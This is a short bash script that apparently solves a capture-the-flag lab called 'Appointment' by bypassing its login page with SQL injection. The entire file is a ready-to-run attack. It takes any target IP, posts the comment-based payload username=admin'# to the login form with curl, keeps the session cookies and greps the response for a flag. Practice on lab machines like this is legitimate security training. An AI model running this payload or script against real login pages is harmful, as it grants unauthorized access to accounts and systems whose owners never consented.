#!/usr/bin/env bash
#
# login-sqli.sh – Bypass Appointment login via SQL‑Injection
# Usage: ./login-sqli.sh <TARGET_IP>

set -euo pipefail

if [[ $# -ne 1 ]]; then
  echo "Usage: $0 <TARGET_IP>"
  exit 1
fi

TARGET=$1
BASE="http://$TARGET"

echo "[*] Submitting SQLi payload to $BASE/login..."
curl -s -X POST "$BASE/login" \
     -d "username=admin'#&password=dummy" \
     -c cookies.txt \
     -L > bypass.html

echo "[*] Extracting flag from response..."
if grep -Eo "flag\{[^}]+\}" bypass.html; then
  echo "[*] Flag retrieved!"
else
  echo "[!] Flag not found in response."
fi
